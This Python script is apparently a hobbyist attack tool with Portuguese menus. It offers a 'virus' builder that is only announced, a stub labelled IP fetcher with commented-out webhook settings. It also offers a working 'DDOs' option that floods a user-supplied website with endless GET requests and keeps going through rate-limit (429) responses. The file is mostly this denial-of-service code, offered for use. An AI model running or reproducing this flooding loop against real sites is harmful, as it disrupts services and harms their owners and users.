import PyInstaller.__main__
import requests
import os
import time 
print("""

\033[36m███████╗███████╗██╗   ██╗███████\033[33m╗██╗  ██╗
\033[36m╚══███╔╝██╔════╝██║   ██║██╔════╝\033[33m╚██╗██╔╝
\033[36m  ███╔╝ █████╗  ██║   ██║███████╗\033[33m ╚███╔╝ 
\033[36m ███╔╝  ██╔══╝  ██║   ██║╚════██║\033[33m██╔██╗ 
\033[36m███████╗███████╗╚██████╔╝███████║\033[33m██╔╝ ██╗
\033[36m╚══════╝╚══════╝ ╚═════╝ ╚══════╝\033[33m╚═╝  ╚═╝
\033[0m                                
""")
print('\033[34m「1」 \033[35mᅳ \033[33mConstruir Virus (IP FETCHER)\033[0m')
print('\033[34m「2」 \033[35mᅳ \033[31mAtaque DDOs\033[0m')
print('\033[34m「3」 \033[35mᅳ \033[32mSair\033[0m')
choice = input('\033[0m✞⫸')
#settings = {
#    "webtoken": "",
#    "username": "XyzHook ᅳ IP Fetcher"
#}
#webtoken=settings['webtoken']
#username=settings['username']

    


fetches = 0
def ddos(site):
    global fetches
    try:
        while True:
            fetches += 1
            res = requests.get(site)
            status = res.status_code
            wait_time = 2
            print(f'Status: {status}, Fetches: {fetches}')
            if status == 429:
                time.sleep(wait_time)
    except Exception as e:
        print(f'Um erro ocorreu! {e}')

def check():
    if int(choice) == 1:
        print('Em breve.')
    elif int(choice) == 2:
        site = input("Insira o site alvo: ")
        ddos(site)
    elif int(choice) == 3:
        exit()
    else:
        print('Escolha invalida!')
check()